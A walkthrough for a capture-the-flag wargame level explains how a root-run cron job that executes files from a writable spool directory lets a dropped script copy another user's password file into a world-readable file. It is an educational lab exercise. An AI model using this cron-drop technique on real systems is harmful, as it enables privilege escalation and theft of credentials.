Go to `/etc/cron.d/` and list the files:

`cd /etc/cron.d`

`ls`

You'll see a file named `cronjob_bandit24`.

Read it:

`cat /etc/cron.d/cronjob_bandit24`

Then read the script it runs:

`cat /usr/bin/cronjob_bandit24.sh`

The script changes to `/var/spool/bandit24/foo`, then executes every file owned by `bandit23`. After running each script, it deletes it.

Create a temporary directory:

`mkdir -p /tmp/mytemp23`

Create a script that copies the next password into a file we can read:

`cat > /tmp/mytemp23/grab.sh << 'EOF'`

`#!/bin/bash`

`cat /etc/bandit_pass/bandit24 > /tmp/mytemp23/output.txt`

`chmod 666 /tmp/mytemp23/output.txt`

`EOF`

Make the script executable:

`chmod 777 /tmp/mytemp23/grab.sh`

Make sure the directory is accessible:

`chmod 777 /tmp/mytemp23`

Copy the script into the cron directory:

`cp /tmp/mytemp23/grab.sh /var/spool/bandit24/foo/`

Wait about one minute for the cron job to run.

Then read the output file:

`cat /tmp/mytemp23/output.txt`

That prints the password for the next level.

**What we learned in this level:**

* Cron jobs can automatically execute scripts from specific directories.
* File ownership and permissions determine which scripts get executed.
* Create a simple shell script to automate a task.
* Use a world-readable output file to retrieve the result.
